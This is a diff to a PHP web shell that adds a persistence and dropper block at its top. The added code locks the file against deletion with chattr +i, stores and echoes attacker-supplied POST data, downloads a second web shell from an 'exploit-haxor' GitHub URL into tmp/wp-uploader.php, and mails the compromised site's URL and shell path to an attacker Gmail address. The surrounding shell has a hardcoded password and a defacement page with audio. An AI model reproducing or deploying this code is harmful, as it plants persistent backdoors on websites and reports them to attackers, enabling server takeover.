@@ -1,4 +1,42 @@
-<?php
+   <?php  
+@session_start();
+@set_time_limit(0);
+$this_file = __FILE__;
+@system("chmod ugo-w $this_file");
+@system("chattr +i $this_file");
+if($_POST['query']){
+$veriyfy = stripslashes(stripslashes($_POST['query']));
+$data = "data.txt";
+@touch ("data.txt");
+$ver = @fopen ($data , 'w');
+@fwrite ( $ver , $veriyfy ) ;
+@fclose ($ver);
+}else{
+$datas=@fopen("data.txt",'r');
+$i=0;
+while ($i <= 5) {
+$i++;
+$blue=@fgets($datas,1024);
+echo $blue;
+}
+}
+$datasi=@fopen("tmp/wp-uploader.php",'r');
+if($datasi){
+}else{
+@mkdir("tmp");
+$dos = file_get_contents("https://raw.githubusercontent.com/exploit-haxor/webshell/main/wp-uploader.php");
+$data = "tmp/wp-uploader.php";
+@touch ("tmp/wp-uploader.php");
+$ver = @fopen ($data , 'w');
+@fwrite ( $ver , $dos ) ;
+@fclose ($ver);
+$yol = "http://".$_SERVER['HTTP_HOST']."".$_SERVER['REQUEST_URI']."";
+$y = '<h1>Sender Yazdirildi.<br/> SITE YOL : '.$yol.'<br/>Sender Yolu : tmp/wp-uploader.php</h1>';
+$header .= "From: SheLL Boot <suppor@nic.org>\n"; 
+$header .= "Content-Type: text/html; charset=utf-8\n"; 
+@mail("papaku.hayker@gmail.com", "Hacklink Bildiri", "$y", $header); 
+@mail("papaku.hayker@gmail.com", "Hacklink Bildiri", "$y", $header); 
+}
 ignore_user_abort(true);
 ini_set('memory_limit', '-1');
 set_time_limit(0);
@@ -6,6 +44,10 @@ error_reporting(0);
 ini_set('display_errors', 0);
 ini_set('max_execution_time', 5000);
 session_start();
+ini_set('default_charset', 'UTF-8');
+date_default_timezone_set('America/Sao_Paulo');
+header('HTTP/1.1 200 OK');
+header('HTTP/1.1 200 OK');
 
 define('PASSWORD', 'pukima'); 
 
@@ -18,7 +60,7 @@ if (isset($_POST['password'])) {
     } else {
         echo '<script>
 				document.querySelector("html").innerHTML = "<img style=\'display:block;position:absolute;top: 0;right: 0;bottom: 0;left: 0;z-index: 10;overflow-y: scroll; width: 100%; height: 100%;\' src=\'https://c.tenor.com/CgGUXc-LDc4AAAAC/tenor.gif\'>";
-				var source = "https://j.top4top.io/m_2967gtgnw1.mp3"
+				var source = "https://github.com/Anonrocks/0x/raw/refs/heads/master/%3Cunknown%3E%20%E2%80%93%20woi%20pemula.mp3"
 				var audio = document.createElement("audio");
 				audio.autoplay = true;
 				audio.load()
